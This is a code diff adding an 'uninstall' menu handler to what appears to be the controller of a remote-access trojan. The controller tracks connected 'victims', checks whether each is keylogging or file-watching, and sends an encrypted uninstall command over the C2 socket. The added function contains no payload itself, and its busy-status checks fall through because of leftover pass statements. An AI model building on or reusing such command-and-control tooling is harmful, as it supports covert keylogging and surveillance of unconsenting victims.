@@ -5020,3 +5020,86 @@ def perform_menu_item_7(connected_clients: dict, source_ip: str, source_port: in
             print(constants.TARGET_VICTIM_NOT_FOUND)
             print(constants.RETURN_MAIN_MENU_MSG)
             print(constants.MENU_CLOSING_BANNER)
+
+
+def perform_menu_item_15(sockets_to_read: list, connected_clients: dict, shared_secret: bytes):
+    # CASE 1: Check if client list is empty
+    if len(connected_clients) == constants.ZERO:
+        print(constants.GET_KEYLOG_FILE_NO_CLIENTS_ERROR)
+
+    # CASE 2: Handle single client in client list
+    if len(connected_clients) == constants.CLIENT_LIST_INITIAL_SIZE:
+        client_socket, (client_ip, client_port, status, status_2) = next(iter(connected_clients.items()))
+
+        # Check status
+        if is_keylogging(status, client_ip, client_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
+            print(constants.RETURN_MAIN_MENU_MSG)
+            print(constants.MENU_CLOSING_BANNER)
+            pass
+            # return None
+        elif is_watching(status_2, client_ip, client_port, constants.WATCH_STATUS_TRUE_ERROR):
+            print(constants.RETURN_MAIN_MENU_MSG)
+            print(constants.MENU_CLOSING_BANNER)
+            pass
+            # return None
+        else:
+            try:
+                print(constants.UNINSTALL_SIGNAL_MSG)
+                client_socket.send(encrypt_string(constants.UNINSTALL, shared_secret).encode())
+                client_socket.send(encrypt_string((constants.PROJECT_NAME + "/" +
+                                                   constants.PROJECT_NAME_ALT), shared_secret).encode())
+            except ConnectionResetError as e:
+                print(constants.UNINSTALL_SUCCESS_MSG)
+            except BrokenPipeError as e:
+                print(constants.UNINSTALL_SUCCESS_MSG)
+            except Exception as e:
+                print(constants.UNINSTALL_ERROR_MSG.format(e))
+            finally:
+                sockets_to_read.remove(client_socket)
+                del connected_clients[client_socket]
+                client_socket.close()
+                print(constants.DISCONNECT_FROM_VICTIM_SUCCESS)
+
+    # CASE 3: Multiple Clients Handler
+    elif len(connected_clients) != constants.ZERO:
+        target_ip = input(constants.ENTER_TARGET_IP_FIND_PROMPT)
+        target_port = int(input(constants.ENTER_TARGET_PORT_FIND_PROMPT))
+        target_socket, target_ip, target_port, status, status_2 = find_specific_client_socket(
+            connected_clients,
+            target_ip,
+            target_port)
+
+        # Check if target socket is currently running keylogger
+        if is_keylogging(status, target_ip, target_port, constants.FILE_TRANSFER_KEYLOG_TRUE_ERROR):
+            print(constants.RETURN_MAIN_MENU_MSG)
+            print(constants.MENU_CLOSING_BANNER)
+            pass
+
+        # Check if file/directory watching
+        if is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
+            print(constants.RETURN_MAIN_MENU_MSG)
+            print(constants.MENU_CLOSING_BANNER)
+            pass
+
+        if target_socket:
+            try:
+                print(constants.UNINSTALL_SIGNAL_MSG)
+                target_socket.send(encrypt_string(constants.UNINSTALL, shared_secret).encode())
+                target_socket.send(encrypt_string((constants.PROJECT_NAME + "/" +
+                                                   constants.PROJECT_NAME_ALT), shared_secret).encode())
+            except ConnectionResetError as e:
+                print(constants.UNINSTALL_SUCCESS_MSG)
+            except BrokenPipeError as e:
+                print(constants.UNINSTALL_SUCCESS_MSG)
+            except Exception as e:
+                print(constants.UNINSTALL_ERROR_MSG.format(e))
+            finally:
+                sockets_to_read.remove(target_socket)
+                del connected_clients[target_socket]
+                target_socket.close()
+                print(constants.DISCONNECT_FROM_VICTIM_SUCCESS)
+        else:
+            print(constants.TARGET_VICTIM_NOT_FOUND)
+
+    print(constants.RETURN_MAIN_MENU_MSG)
+    print(constants.MENU_CLOSING_BANNER)
